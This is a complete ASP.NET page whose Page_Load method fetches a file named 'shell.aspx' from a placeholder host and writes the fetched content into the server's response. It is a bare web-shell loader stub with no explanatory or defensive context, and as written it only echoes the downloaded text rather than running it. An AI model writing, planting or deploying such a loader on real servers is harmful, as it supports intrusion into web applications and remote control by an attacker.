<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<script runat="server">
    void Page_Load()
    {
        WebClient client = new WebClient();
        string code = client.DownloadString("http://your-server.com/shell.aspx");
        Response.Write(code);
    }
</script>
